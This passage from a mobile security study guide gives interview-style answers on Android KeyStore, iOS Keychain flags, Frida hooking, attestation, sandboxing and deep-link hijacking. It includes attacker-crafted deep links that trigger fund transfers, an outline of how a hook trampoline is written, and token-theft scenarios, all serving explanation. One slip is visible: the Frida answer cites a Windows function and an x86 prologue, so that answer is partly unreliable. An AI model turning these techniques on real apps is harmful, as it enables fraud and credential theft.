  - Multiple authentication failures (brute force pattern)
  - Unusual API call patterns from a session (automated tooling signature)
  - Crash events with stack traces (anonymized — strip local paths, PIDs)
  - Unusual deep link parameters (malformed or injection-attempt patterns)
  
What NOT to log from the client:
  - Plaintext passwords (obvious)
  - API tokens (would be accessible in server logs → theft vector)
  - PII fields (name, email, SSN, DOB) in crash reports
  - Full stack traces (may reveal internal logic useful for attackers)
  - Network response bodies (may contain sensitive data)
```

---

## 10. Interview Questions

### Q1: Explain exactly how Android's KeyStore hardware-backing prevents a root user from extracting an AES-256 key. Trace the key material from creation to use.

**Answer:**

When an app generates an AES-256 key with `KeyStore`, the following happens if hardware backing (StrongBox or TEE) is available:

**Key generation:** The Android Keystore API call from the app traverses the Binder IPC to the `KeyStore` service in `system_server`. The service forwards the request to the Keymaster HAL (Hardware Abstraction Layer), which sends it to the Trusted Execution Environment — a separate, isolated processor with its own firmware (ARM TrustZone or a dedicated StrongBox chip like the Titan M on Pixel devices). The TEE generates the AES key internally using its own hardware random number generator.

**Key storage:** The raw AES key bytes NEVER enter the Normal World (Android OS). Instead, the TEE creates an encrypted key blob: it takes the key material and encrypts it with a Device Unique Key (DUK) that was fused into the hardware at the factory and is readable only from within the TEE. The encrypted blob is returned to the Normal World and stored in `/data/misc/keystore/user_0/{alias}`.

**Why root can't extract it:** A root user can read the key blob file. But the blob is AES-encrypted by the DUK. To decrypt it, you'd need the DUK — which never leaves the TEE hardware. Even if you extract the entire NAND flash, you'd have encrypted blobs with no key to decrypt them. The DUK is not on any accessible memory bus.

**Key use:** When the app calls `Cipher.init(ENCRYPT_MODE, keyEntry)`, the request goes again through Binder → Keymaster HAL → TEE. The TEE decrypts the blob with the DUK (inside the TEE), recovers the AES key, performs the cryptographic operation on the provided data, and returns the ciphertext. The plaintext AES key material exists only inside the TEE during the operation.

**The one caveat:** If `setStrongBoxBacked(false)` (or StrongBox isn't available), the TEE is the Trustzone software environment — the TEE code can potentially be attacked if the Trustzone firmware has a vulnerability. StrongBox (a separate hardware chip) is more resistant because it has a completely separate hardware security boundary.

---

### Q2: A developer uses `kSecAttrAccessibleWhenUnlocked` without "ThisDeviceOnly". What are the concrete attack scenarios this enables that "ThisDeviceOnly" would prevent?

**Answer:**

`kSecAttrAccessibleWhenUnlocked` (without "ThisDeviceOnly") means the item participates in **iCloud Keychain synchronization** and is included in **local encrypted iTunes/Finder backups**.

**Attack Scenario 1: iCloud Keychain Sync**

If the user's iCloud account is compromised (phishing, credential stuffing, iCloud password reuse), the attacker gains access to ALL Keychain items synced to iCloud. This includes the authentication token or encryption key your app stored in the Keychain. The attacker doesn't need the physical device. They sign into iCloud on their own device, sync the Keychain, and extract the token.

Practical example: A banking app stores a persistent refresh token in `kSecAttrAccessibleWhenUnlocked`. User reuses their iCloud password on a breached site. Attacker gets iCloud credentials → downloads iCloud Keychain backup → extracts the refresh token → makes authenticated API calls to the banking backend from their server.

**Attack Scenario 2: Local iTunes Backup Restore on Another Device**

A user makes an encrypted iTunes backup (or Finder backup on newer macOS). The backup password can be set by the user — or if not set, a random key is used. Items with `kSecAttrAccessibleWhenUnlocked` are backed up into this file. An attacker who can access the backup file (compromised backup location, copied from a Mac) and knows or can brute-force the backup password can restore the backup to a different device and access the Keychain items.

**What "ThisDeviceOnly" prevents:**

Adding "ThisDeviceOnly" means the item is encrypted with a key derived from the Secure Enclave's UID — a key that never leaves the hardware and is unique to this device. The item literally cannot be decrypted on any other device. It's not included in cloud backups. It's not included in local backups. Even if every backup is stolen, the Keychain item remains inaccessible without the original hardware.

**Engineering tradeoff:** "ThisDeviceOnly" items are permanently lost when the user upgrades to a new phone. The app must handle this gracefully — prompt the user to re-authenticate and re-issue credentials. For authentication tokens, this is correct behavior. For encryption keys protecting user data, the app must provide a key recovery mechanism (re-authentication with the server to receive a new key for the data already encrypted on the old device... which creates its own complexity). This tradeoff is why developers often make the wrong choice — "ThisDeviceOnly" creates UX friction.

---

### Q3: Walk through how Frida hooks a function at the machine code level. Why can't the standard NDK's `dlopen`/`dlsym` detect this?

**Answer:**

**Frida's hooking mechanism (Frida's Gum engine):**

When Frida's `Interceptor.attach(targetAddress, callbacks)` is called, the following happens at the machine code level:

1. **Read original bytes:** Frida reads the first N bytes of the target function where N is large enough to contain one complete instruction sequence to be replaced by a JMP/branch instruction. On ARM64 (modern Android/iOS), a branch instruction is 4 bytes but the target might be far away, so Frida may use a sequence like:
   ```
   LDR X17, #8     (load address of trampoline from next 8 bytes)
   BR X17          (branch to trampoline)
   .quad 0xtrampoline_address
   ```
   That's 16 bytes minimum.

2. **Write the hook:** Frida modifies the memory protection of the function's pages (`mprotect` to `PROT_READ|PROT_WRITE`), overwrites the first 16 bytes with the branch to the Frida trampoline, then restores the page protection to `PROT_READ|PROT_EXEC`.

3. **Create the trampoline:** Frida allocates memory near the original function (within branch range). The trampoline:
   - Saves all registers (prologue of the intercepted call)
   - Calls the JavaScript `onEnter` callback via the Duktape/V8 runtime
   - Executes the original 16 bytes that were overwritten (relocated with fixed-up addresses if they were PC-relative instructions)
   - Jumps back to the original function + 16 bytes offset
   - After the original function returns: calls `onLeave` callback
   - Returns to the original caller

**Why standard `dlopen`/`dlsym` can't detect this:**

`dlopen("libnative.so")` and `dlsym(handle, "target_function")` work at the **dynamic linker level** — they resolve symbolic names to virtual addresses using the ELF symbol table. Frida's hook modifies **the bytes at the target address** — it doesn't change the symbol table, the dynamic linker structures, or any other metadata. So `dlsym(handle, "NSSomething")` still returns the correct address — which is now the beginning of Frida's hook. The function "exists" at that address; its first instruction is just now a branch to Frida instead of the original code.

To detect Frida hooks, you need to read the BYTES at the function's address and compare them to what you expect, or compute a hash of the function's code at startup and re-verify it later. The bytes at `NtOpenProcess` start address change from `MOV R10, RCX` (syscall prologue) to `JMP 0xfrida_trampoline` — that's detectable if you know what to look for. This is why RASP implementations check specific byte patterns at entry points of hooked functions.

---

### Q4: Explain the "Secret Zero" problem in mobile apps and how modern attestation (SafetyNet/AppAttest) solves it. What are the remaining limitations?

**Answer:**

**The Secret Zero problem:**

A mobile app needs to authenticate to a backend server. To prove identity, it needs a credential (API key, client certificate). But where does the first credential come from? If you embed it in the app binary, attackers extract it via static analysis. If you fetch it at first launch from a server, how does the server know it's talking to a genuine install and not an emulator or modified app? You need credentials to get credentials — this is the bootstrapping paradox.

**How SafetyNet/Play Integrity solves it:**

On first launch, instead of presenting a hardcoded credential, the app requests an attestation token from the Android Attestation Service. This involves:

1. The app requests a nonce from your backend
2. The app calls Google's Play Integrity API with that nonce
3. Google's servers check: Is this a genuine Android device? Is the bootloader locked? Is this the exact unmodified APK from the Play Store?
4. Google returns a signed JWT (signed by Google's private key)
5. Your backend receives this JWT, verifies Google's signature (using Google's public key), and if valid, issues a session token

The JWT contains Google's assertion about the device and app integrity. Your backend trusts Google's signature (a well-known CA). The secret is Google's private key — which the app never possesses. This breaks the circular dependency.

**Remaining limitations:**

**1. The "legitimate but compromised" case:** SafetyNet/AppAttest only validates that the app is the unmodified Play Store version on a genuine device. It says nothing about whether the specific device instance is compromised. A fresh Pixel phone that was just rooted will lose device integrity verdicts — BUT a sophisticated attacker can use a genuine, non-rooted device as a "signing oracle" to get valid attestations, then use those attestations to make requests from a different machine. The attestation is bound to the nonce but not to the subsequent requests.

**2. Replay attacks on assertions:** If an attacker can capture a valid attestation JWT, they can potentially reuse it (within its validity window). The nonce prevents pre-computation but not capture-and-replay. Solution: tie the attestation assertion to specific API requests (include a hash of the request body in the nonce), use short-lived assertions.

**3. Hardware attestation doesn't prevent behavioral abuse:** A legitimate, non-jailbroken device running the real app can still be automated (via Appium, XCTest) to perform fraud. Attestation says "this is a real app on a real device" — it doesn't say the user is the account holder or that the behavior is human-initiated. Behavioral analytics on the backend are still necessary.

**4. iOS AppAttest revocation gap:** Once an assertion is generated, it's valid for its duration. There's no revocation mechanism for individual assertions. If an attacker obtains a valid assertion (unlikely but not impossible if device is briefly compromised), there's no way to invalidate it before expiry.

---

### Q5: How does Android's process isolation via UIDs compare to iOS's sandbox model? What's the fundamental difference in their security assumptions?

**Answer:**

**Android's model — Unix DAC + SELinux:**

Android is built on Linux, and its core isolation is Linux Discretionary Access Control (DAC): each app gets a unique UID in the 10000+ range. File system permissions are set `rwx------` (owner only) for app data directories. Other apps running as different UIDs cannot read app data — the kernel enforces this at the system call level for all file operations.

SELinux adds Mandatory Access Control: even if an app somehow gets another app's UID (shouldn't happen, but defense in depth), the SELinux policy further restricts what processes with that context can do. An `untrusted_app` SELinux domain cannot access files labeled `system_data_file` even if it has root UID.

The fundamental assumption: the kernel and SELinux policy are trustworthy. If root is obtained (kernel exploit, vulnerable su binary), ALL Android app isolation breaks. Root can `ptrace` any process, read `/proc/{pid}/mem` for any process, and access any file regardless of permissions.

**iOS's model — Mach Capabilities + Seatbelt:**

iOS uses a Mach microkernel, and its sandbox is enforced via the Seatbelt (sandbox.kext) kernel extension. Each app gets a per-container UUID-based directory, and sandbox policies are compiled rules specifying exactly which filesystem paths, Mach ports, network connections, and APIs the app can access.

But the deeper difference: iOS apps don't have UIDs in the traditional sense (well, they run as `mobile` UID, but that's shared). The isolation is primarily achieved via the sandbox policy and capability model (entitlements). Entitlements are cryptographically signed by Apple — an app cannot claim a capability it doesn't have, because the code signature covers the entitlements plist.

**The fundamental difference:**

Android's model relies on **identity** (UIDs) enforced by the kernel. iOS's model relies on **capability** (entitlements) enforced by the kernel + code signing.

On Android: compromise the kernel → compromise all apps. Compromise root → nearly all apps.

On iOS: the Secure Enclave and AMFI (Apple Mobile File Integrity) enforce code signing even within what iOS considers "kernel level." A jailbreak that compromises the iOS kernel can bypass sandbox policies — BUT cryptographic keys in the Secure Enclave remain protected (the SEP has its own isolated execution environment that doesn't trust the Application Processor OS). This is why Keychain items with "ThisDeviceOnly" are still secure even on jailbroken devices — the Secure Enclave hasn't been compromised (SEP jailbreaks are extremely rare and usually hardware-specific).

The practical implication: on a jailbroken iOS device, an attacker can read app files (sandbox bypassed), but cannot necessarily extract Secure Enclave-backed cryptographic keys. On a rooted Android device without StrongBox (Titan M equivalent), all KeyStore material may be extractable because it's protected only by the TrustZone TEE — which can be targeted if the TZ firmware has vulnerabilities.

---

### Q6: What is a custom scheme deep link hijacking attack, and how does Universal Links / App Links mitigate it? What residual risk remains?

**Answer:**

**Custom scheme hijacking:**

When an app registers a custom URL scheme (e.g., `mybank://`), ANY other app on the device can claim the same scheme. On iOS, if multiple apps register the same scheme, iOS presents a chooser or routes to one arbitrarily (undefined behavior). On Android, the user gets a dialog asking which app should handle the intent.

An attacker publishes a malicious app called "MyBank Helper" that also registers `mybank://`. When the victim's bank website or another legitimate app fires `mybank://auth?token=abc123` — perhaps to complete an OAuth flow — the OS may route it to the attacker's app. The attacker's app receives the token in the deep link URL. On iOS, the attacker cannot control which app receives it (first-registered usually wins), but on Android, the user dialog is social-engineerable ("Oh, MyBank Helper? Sure, that sounds official").

Additionally: malicious websites can fire custom schemes. `<a href="mybank://transfer?amount=1000&to=attacker">Click me</a>` — when clicked, the browser sends this to the registered handler without any domain verification.

**How App Links (Android) / Universal Links (iOS) mitigate:**

Both require the server to cryptographically prove that it authorizes a specific app to handle its URLs. For Android App Links:
- The developer adds `android:autoVerify="true"` to the intent filter
- Android downloads `https://bank.com/.well-known/assetlinks.json` at install time
- This JSON contains the app's package name + SHA-256 of its signing certificate
- Only the verified app can handle `https://bank.com/auth?token=abc123`
- A malicious app cannot create a matching assetlinks.json for `bank.com` (they don't control the server)

**Residual risks:**

1. **Verification timing:** Android verifies at install time but uses a network request. If the CDN is unavailable or the request fails, Android falls back to allowing any app to handle the URL. Attacks during degraded network can exploit this.

2. **Subpath specificity:** If your assetlinks.json covers `bank.com/*` but you have a subdomain `partner.bank.com` that a partner controls, they could host a malicious assetlinks.json that hijacks links to that subdomain.

3. **Server compromise:** If an attacker compromises `bank.com/.well-known/assetlinks.json`, they can add their own app to the list, effectively hijacking links to your domain. But if they've already compromised your server, the app link problem is the least of your worries.

4. **The parameters problem:** Even with verified Universal Links, the parameters in the URL are attacker-controlled if the URL is reached from a malicious context. A phishing page with `<a href="https://bank.com/pay?amount=10000&to=attacker">` will correctly route to the bank app (the app is verified), but the parameters are attacker-crafted. The app must validate all parameters as untrusted input, regardless of source.

---

*Document ends. Coverage: complete Android/iOS security architecture — Zygote fork, SELinux, iOS Seatbelt, TEE/Secure Enclave, Keystore/Keychain mechanics, certificate pinning implementation, Binder IPC, Frida hooking mechanics at machine code level, BYOD bypasses, root/jailbreak detection with implementations, RASP, backup vulnerabilities, keyboard cache attacks, SafetyNet/AppAttest attestation, and 6 deep interview questions with complete technical answers.*